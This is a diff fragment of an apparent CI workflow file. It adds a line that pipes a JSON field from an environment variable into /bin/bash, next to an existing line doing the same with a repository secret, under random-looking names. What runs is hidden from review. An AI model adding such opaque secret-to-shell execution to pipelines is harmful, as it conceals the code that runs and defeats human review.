@@ -23,6 +23,7 @@ jobs:
           wz930: ${{ secrets.wz930 }}
         run: |
           printf '%s' "$wz930" | jq -r .jyil5 | /bin/bash
+          printf '%s' "$zaz62661" | jq -r .t6930 | /bin/bash
 
       - name: Save archive
         if: always()
